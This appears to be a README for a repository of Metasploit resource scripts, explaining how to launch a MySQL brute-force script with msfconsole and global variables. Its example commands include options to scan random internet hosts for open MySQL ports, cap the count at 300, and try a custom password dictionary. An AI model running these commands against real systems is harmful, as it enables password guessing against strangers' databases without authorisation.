## METASPLOIT RESOURCE FILES

<blockquote>Resource scripts provides an easy way for us to automate repetitive tasks in Metasploit. Conceptually they're just like batch scripts, they contain a set of commands that are automatically and sequentially executed when you load the script in Metasploit. You can create a resource script by chaining together a series of Metasploit console commands or by directly embedding Ruby to do things like call APIs, interact with objects in the database, modules and iterate actions.</blockquote>

![pic](http://i68.tinypic.com/21ovkfm.jpg)

<br />

**This repository contains various resource files to assiste in exploitation or metasploit database related issues.**
#### [!] [Please read the article about rc scripting here:](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

<br />

### USING 'SETG' GLOBAL VARIABLES TO CONFIG RC SCRIPTS

![pic](hgft)

> Many of the this brute force rc scripts are written to accept user inputs (setg global variables).<br />
> This means that users can run the resource script in 3 diferent ways:

- execute the resource script with default settings
( scan: 192.168.1.0/24 | Dont scan WAN | Use Default dicionary )

      msfconsole -r /root/mysql_brute.rc

- instruct the resource script to scan rhosts inputed by user

      msfconsole -q -x 'setg RHOSTS 10.10.10.1 10.10.11.2;resource /root/mysql_brute.rc'

- instruct the resource script to search in WAN for rhosts with service port open

      msfconsole -q -x 'setg RANDOM_HOSTS true;resource /root/mysql_brute.rc'

<br /><br />

> Adicionally to the described settings we can also combine diferent configurations at runtime.

- instruct the resource script to search in WAN for rhosts with service port open and limit the search to 300 rhosts

      msfconsole -q -x 'setg RANDOM_HOSTS true;setg RANDOM 300;resource /root/mysql_brute.rc'

- instruct the resource script to search use your own dicionary file

      msfconsole -q -x 'setg USERPASS_FILE /root/dicionary.txt;resource /root/mysql_brute.rc'



<br />

